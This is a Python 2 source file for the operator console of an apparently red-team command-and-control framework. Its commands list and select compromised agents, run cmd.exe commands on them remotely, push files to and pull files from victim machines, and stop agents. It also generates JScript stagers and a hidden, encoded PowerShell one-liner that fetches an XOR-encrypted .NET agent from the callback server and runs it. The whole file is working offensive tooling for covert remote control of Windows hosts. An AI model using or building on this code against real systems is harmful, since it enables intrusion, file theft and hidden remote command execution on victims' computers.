# -*- coding: utf8 -*-
import readline
import cmd
import os.path
from sys import platform as _platform
from threading import Thread

import config
from lib import helpers
from lib.crypto import Crypto

# Fix OSX platform bug with readline library
if _platform == "darwin":
	if 'libedit' in readline.__doc__:
	    readline.parse_and_bind("bind ^I rl_complete")
	else:
	    readline.parse_and_bind("tab: complete")

# Fix the use of the "-" as a delimiter
old_delims = readline.get_completer_delims()
readline.set_completer_delims(old_delims.replace('-', ''))

#****************************************************************************************
# Thread handling all command line interactions
#****************************************************************************************
class ConsoleThread(Thread):
	#------------------------------------------------------------------------
	# Constructor
	def __init__(self, m2cQueue, c2mQueue, agentList):
		Thread.__init__(self)
		self.m2cQueue = m2cQueue # Main thread to Console thread queue
		self.c2mQueue = c2mQueue # Console thread to Main thread queue
		self.agentList = agentList
	
	#------------------------------------------------------------------------
	# Thread entry point
	def run(self):
		mainMenu = MainMenu(self.m2cQueue, self.c2mQueue, self.agentList)
		mainMenu.cmdloop()

#****************************************************************************************
# Class handling console main menu interactions
#****************************************************************************************
class MainMenu(cmd.Cmd):
	
	#------------------------------------------------------------------------------------
	def __init__(self, m2cQueue, c2mQueue, agentList):
		cmd.Cmd.__init__(self)
		self.m2cQueue = m2cQueue # Main thread to Console thread queue
		self.c2mQueue = c2mQueue # Console thread to Main thread queue
		self.agentList = agentList
		self.currentAgentID = None
		self.prompt = "[no agent]#> "

	#------------------------------------------------------------------------------------	
	def do_list(self, args):
		"""Show the list of all discovered agents with their current status"""
		print helpers.color("\tAgent list\n\t-----------------", "blue")
		if len(self.agentList) > 0:
			for agentID in self.agentList.keys():
				print helpers.color("\t[{}]".format(agentID), "blue")
		else:
			print helpers.color("\t<no agent>", "blue")

	#------------------------------------------------------------------------------------
	def do_use(self, args):
		"""use <agentID>\nSelect the current agent to work with"""

		# Checking args
		if not args:
			print helpers.color("[!] Please specify an agent ID. Command format: use <agentID>")
			return
		
		agentID = args.split()[0]

		if not agentID in self.agentList:
			print helpers.color("[!] Invalid agent ID")
			return

		# Sending message to main thread to switch to a new agent ID
		self.c2mQueue.put({'type': 'switchAgent', 'ID': agentID})

		# Waiting for main thread's response
		mainMessage = self.m2cQueue.get()
		
		if mainMessage['type'] == 'switchAgent':
			if mainMessage['value'] == 'OK':
				self.currentAgentID = agentID
				self.prompt = "[{}]#> ".format(agentID)
			elif mainMessage['value'] == 'NOK':
				print helpers.color("[!] Agent not available anymore")
		else:
			# Unexpected mainMessage type at this stage
			print helpers.color("[!] Unexpected message type at this stage: ")
			print mainMessage

	#------------------------------------------------------------------------------------
	def complete_use(self, text, line, startidx, endidx):
		return [agentID for agentID in self.agentList if agentID.startswith(text)]

	#------------------------------------------------------------------------------------
	def do_cli(self, args):
		"""Switches to the CLI command mode to task current agent with some CLI commands (cmd.exe)"""
		
		if not self.currentAgentID:
			print(helpers.color("[!] No agent selected.\nUse the 'list' command to get the list of available agents, then 'use' to select one"))
			return

		print helpers.color("[*] Switching to CLI mode")
		print helpers.color("[*] Use the command 'back' to exit CLI mode")
		
		while True:
			cli = raw_input("[{}-cli]#> ".format(self.currentAgentID))
			if cli:
				if cli == 'back':
					return
				else:
					request = helpers.b64encode('cli')+'|'+helpers.b64encode(cli)

					# Send message to the main thread for dispatching
					self.c2mQueue.put({'type': 'request', 'value': request})

					# Wait for main thread's answer, block until we get an answer
					response = self.m2cQueue.get()

					if response['type'] == 'response':
						print helpers.b64decode(response['value'])
					elif response['type'] == 'disconnected':
						self.prompt = "[no agent]#> "
						self.currentAgentID = None
						return

	#------------------------------------------------------------------------------------
	def do_putFile(self, args):
		"""putFile <local file> [destination directory]\nSend a local file to the current agent. If no destination directory is provided, %TEMP% is used"""

		if not self.currentAgentID:
			print helpers.color("[!] No agent selected. Use the 'list' command to get the list of available agents, then 'use' to select one")
			return

		# Checking args
		if not args:
			print helpers.color("[!] Missing arguments. Command format: putFile <local file> [destination path]")
			return
		
		try:
			arguments = helpers.retrieveQuotedArgs(args,2)
		except ValueError as e:
			print helpers.color("[!] Wrong arguments format: {}".format(e))
			return
	
		localFile = arguments[0]
		
		# Path normalization for Windows
		if len(arguments) > 1:
			# Add a trailing backslash if missing and replace forward slashes to backslashes
			destinationPath = arguments[1].replace("/","\\") + "\\" if arguments[1][-1] != "\\" else arguments[1].replace("/","\\")
		else:
			destinationPath = "temp"
		
		# Check local file actually exists
		if os.path.isfile(localFile):
			fileName = os.path.basename(localFile)
			
			# Open local file and base64 encode it
			try:
				with open(localFile) as fileHandle:
					fileBytesEncoded = helpers.b64encode(fileHandle.read())
					fileHandle.close()

					request = helpers.b64encode('tfc22a')+'|' \
								+fileBytesEncoded+'|' \
								+helpers.b64encode(destinationPath)+'|' \
								+helpers.b64encode(fileName)

					# Send message to the main thread for dispatching
					self.c2mQueue.put({'type': 'request', 'value': request})

					# Wait for main thread's answer
					response = self.m2cQueue.get()

					if response['type'] == 'response':
						print helpers.b64decode(response['value'])
					elif response['type'] == 'disconnected':
						self.prompt = "[no agent]#> "
						self.currentAgentID = None
						return
			except IOError:
				print helpers.color("[!] Could not open or read file [{}]".format(localFile))
		else:
			print helpers.color("[!] Unable to find local file [{}] in the default PATH".format(localFile))
		
	#------------------------------------------------------------------------------------
	def complete_putFile(self, text, line, startidx, endidx):
		result = []
		for f in os.listdir('.'):
			if os.path.isfile(f) and f.startswith(text):
				if f.count(' ') > 0:
					result.append('"' + f + '"')
				else:
					result.append(f)
		return result

	#------------------------------------------------------------------------------------
	def do_getFile(self, args):
		"""getFile <agent local file>\nDownload a file from the agent to the local system"""
		
		if not self.currentAgentID:
			print helpers.color("[!] No agent selected. Use the 'list' command to get the list of available agents, then 'use' to select one")
			return

		# Checking args
		if not args:
			print helpers.color("[!] Missing arguments. Command format: getFile <agent local file>")
			return
		
		try:
			arguments = helpers.retrieveQuotedArgs(args,1)
		except ValueError as e:
			print helpers.color("[!] Wrong arguments format: {}".format(e))
			return

		# Path normalization for Windows
		fileName = os.path.basename(arguments[0])

		# Path normalization for Windows
		filePath = arguments[0].replace("/","\\")
		
		
		request = helpers.b64encode('tfa2c2')+'|'+helpers.b64encode(filePath)
		
		# Send message to the main thread for dispatching
		self.c2mQueue.put({'type': 'request', 'value': request})

		# Wait for main thread's answer
		response = self.m2cQueue.get()

		if response['type'] == 'response':
			# Save file in the incoming folder
			try:
				with open(config.INCOMINGFILES+'/'+fileName, 'w+') as fileHandle:
					fileHandle.write(helpers.b64decode(response['value']))
					fileHandle.close()
			except IOError:
				print helpers.color("[!] Could not write to file [{}]".format(config.INCOMINGFILES+'/'+fileName))
		elif response['type'] == 'disconnected':
			self.prompt = "[no agent]#> "
			self.currentAgentID = None			

	#------------------------------------------------------------------------------------
	def do_stop(self, args):
		"""Stop the current agent"""

		if not self.currentAgentID:
			print helpers.color("[!] No agent selected. Use the 'list' command to get the list of available agents, then 'use' to select one")
			return
		
		choice = raw_input(helpers.color("\n[>] Are you sure you want to stop this agent ? [y/N] ", "red"))
		if choice.lower() != "" and choice.lower()[0] == "y":
			request = helpers.b64encode('stop')

			# Send message to the main thread for dispatching
			self.c2mQueue.put({'type': 'request', 'value': request})

			# Wait for main thread's answer
			
			# First response is from the agent terminating		
			response = self.m2cQueue.get()

			if response['type'] == 'response':
				print helpers.b64decode(response['value'])
			else:
				# Unexpected mainMessage type at this stage
				print helpers.color("[!] Unexpected message type at this stage: ")
				print mainMessage
				
			# Second message is from the websocketserver on websocket close		
			response = self.m2cQueue.get()

			if response['type'] != 'disconnected':
				# Unexpected mainMessage type at this stage
				print helpers.color("[!] Unexpected message type at this stage: ")
				print mainMessage
			
			self.prompt = "[no agent]#> "
			self.currentAgentID = None

	#------------------------------------------------------------------------------------
	def do_genStager(self, args):
		"""genStager <jscript1|jscript2|jscript3>\nGenerates a stager of the selected type"""

		# Checking args
		if not args:
			print helpers.color("[!] Missing arguments. Command format: genStager <stager_name>")
			return

		# Retrieve the type of stager to generate
		stagerType = args.split()[0]

		# Check it is a supported type of stager
		if stagerType not in ['jscript1', 'jscript2', 'jscript3', 'psoneliner']:
			print helpers.color("[!] Invalid stager type")
			return
		
		# Common parameters for stager generation
		params = {'callbackURL': config.CALLBACK, 'port': config.PORT, 'prefix': config.IDPREFIX}
		
		#---- Generate stager jscript1
		if stagerType == 'jscript1':
			stager = helpers.convertFromTemplate(params, 'templates/wsc2Agent1_js.tpl')
			stagerFileName = config.STAGERFILES + '/wsc2Agent1.js'
			try:
				with open(stagerFileName, 'w+') as fileHandle:
					fileHandle.write(stager)
					fileHandle.close()
					print helpers.color("[+] Stager created as [{}]".format(stagerFileName))
			except IOError:
				print helpers.color("[!] Could not create stager file [{}]".format(stagerFileName))

		#---- Generate stager jscript2
		elif stagerType == 'jscript2':
			stager = helpers.convertFromTemplate(params, 'templates/wsc2Agent2_js.tpl')
			stagerFileName = config.STAGERFILES + '/wsc2Agent2.js'
			try:
				with open(stagerFileName, 'w+') as fileHandle:
					fileHandle.write(stager)
					fileHandle.close()
					print helpers.color("[+] Stager created as [{}]".format(stagerFileName))
			except IOError:
				print helpers.color("[!] Could not create stager file [{}]".format(stagerFileName))
		
		#---- Generate stager jscript3
		elif stagerType == 'jscript3':
			stager2 = helpers.convertFromTemplate(params, 'templates/wsc2Agent2_js.tpl')
			stager2Encoded = helpers.b64encode(stager2)
			stager = helpers.convertFromTemplate({'encoded': stager2Encoded}, 'templates/wsc2Agent3_js.tpl')
			stagerFileName = config.STAGERFILES + '/wsc2Agent3.js'
			try:
				with open(stagerFileName, 'w+') as fileHandle:
					fileHandle.write(stager)
					fileHandle.close()
					print helpers.color("[+] Stager created as [{}]".format(stagerFileName))
			except IOError:
				print helpers.color("[!] Could not create stager file [{}]".format(stagerFileName))

		#---- Generate stager psoneliner
		elif stagerType == 'psoneliner':
			# Get bytes from the .Net assembly WSC2 agent
			try:
				with open(config.AGENTRELEASE) as fileHandle:
					agentBytes = bytearray(fileHandle.read())
					fileHandle.close()
			except IOError:
				print helpers.color("[!] Could not read agent release file [{}]".format(config.AGENTRELEASE))
			
			# We'll simply use the sha256 hash of the password as the XOR encryption key
			xorKey = Crypto.convertKey(config.XORPASSWORD, outputFormat = "sha256")
			
			# Write the XOR encrypted agent file in the web static delivery folder
			try:
				with open(config.STATICFILES+'/'+'agent.txt' , 'w+') as fileHandle:
					fileHandle.write(Crypto.xor(agentBytes, xorKey))
					fileHandle.close()
			except IOError:
				print helpers.color("[!] Could not write xor encrypted agent file [{}]".format(config.STATICFILES+'/'+'agent.txt'))
				return
			
			params['xorKey'] = xorKey
			posh = helpers.convertFromTemplate(params, 'templates/posh.tpl')
			print helpers.color("[+] Powershell one liner:")
			print "powershell.exe -NoP -sta -NonI -W Hidden -e {}".format(helpers.powershellEncode(posh))

	#------------------------------------------------------------------------------------
	def complete_genStager(self, text, line, startidx, endidx):
		return [stager for stager in ['jscript1', 'jscript2', 'jscript3', 'psoneliner'] if stager.startswith(text)]
	
	#------------------------------------------------------------------------------------	
	def do_shell(self, args):
		"""shell <os command>\nor\n! <os command>\nExecute a shell command on the local system"""
		os.system(args)

	#------------------------------------------------------------------------------------
	def do_exit(self, args):
		"""Exit the program"""
		choice = raw_input(helpers.color("\n[>] Exit? [y/N] ", "red"))
		if choice.lower() != "" and choice.lower()[0] == "y":
			self.c2mQueue.put({'type': 'exit'})
			return True
		else:
			return False

	#------------------------------------------------------------------------------------
	def do_help(self, args):
		"""Show the help menu"""
		cmd.Cmd.do_help(self, args)
	
	#------------------------------------------------------------------------------------
	def emptyline(self):
		# Check if the current agent is still available
		if self.currentAgentID not in self.agentList:
			self.prompt = "[no agent]#> "
		
	#------------------------------------------------------------------------------------
	def default(self, line):
		print (">>> Unknown command. Type 'help' or '?' to get a list of available commands.")
